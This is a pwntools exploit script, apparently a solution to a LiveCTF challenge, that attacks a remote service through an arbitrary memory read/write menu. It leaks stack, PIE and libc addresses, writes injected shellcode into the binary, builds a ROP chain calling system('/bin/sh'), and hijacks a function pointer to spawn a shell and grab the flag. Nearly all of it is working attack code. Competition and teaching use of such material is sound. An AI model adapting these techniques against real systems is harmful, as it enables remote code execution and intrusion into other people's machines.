from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


p = remote(HOST, int(PORT))
# p = process('./challenge',env={'LD_PRELOAD':"./libc.so.6"})
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla("ice: \n",str(c))
def read(a):
    cmd(1)
    sla(": \n",hex(a))
def write(a,v):
    cmd(2)
    sla(": \n",hex(v))
    sla(": \n",hex(a))

cmd(1)
sla(": \n","0")
ru("Value: ")
stack = int(ru("\n")[:-1],16)
warning(hex(stack))



read(stack-0x100)
ru("Value: ")
pie = int(ru("\n")[:-1],16)
warning(hex(pie))
target = pie- 0x220
pie = pie - (0x555555555220-0x555555554000)




read(pie+0x3530)
ru("Value: ")
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')

base = int(ru("\n")[:-1],16) - libc.sym['fork']
warning(hex(base))

def writesh(addr,sh):
    for x in range(0,len(sh),8):
        # print(x)
        write(addr+x,u64(sh[x:x+8].ljust(0x8,b'\x90')))
    

sh = '''
mov rax,0x6e
syscall
push rax
'''
# base +=0x70
# base += 0x1310-0x2000e

keys = [pie+0x3500,]
values = [pie+0x1660,]

shX = asm(shellcraft.sh())
rdi = 0x000000000002a3e5+base
warning(hex(base))

rop = ROP(libc)
rdi = rop.find_gadget(['pop rdi','ret'])[0]+base

ropo = [rdi+1,rdi,base+libc.search(b"/bin/sh").__next__(),libc.sym['system']+base]

ct = 0 
for x in ropo:
    keys.append(stack-0x100-0x10+ct*8)
    ct+=1
    values.append(x)

print(keys,values)
helperx = pie+0x14FC
for x in range(len(keys)):
    addr = keys[x]
    val  = values[x]
    fnt = f'''
    mov rax, [rsp]
    mov rdi,rax
    mov rsi,{addr}
    mov rdx,{val}
    mov rax, {helperx}
    call rax
    '''
    sh+=fnt
sh+='''
X:
jmp X
'''
# print(sh)
writesh(target,asm(sh))




target2 = 0x1210+pie
hook=f'''
mov rax,{target}
call rax
'''
writesh(target2,asm(hook))
# gdb.attach(p,'')
context.log_level='debug'

cmd(3)
# sleep(0.5)
# input()
# p.read()

p.sendline(b"./submitter")
# print("waiting for flag")
warning('%s', p.recvline_contains(b'LiveCTF{').decode().strip())

p.interactive()
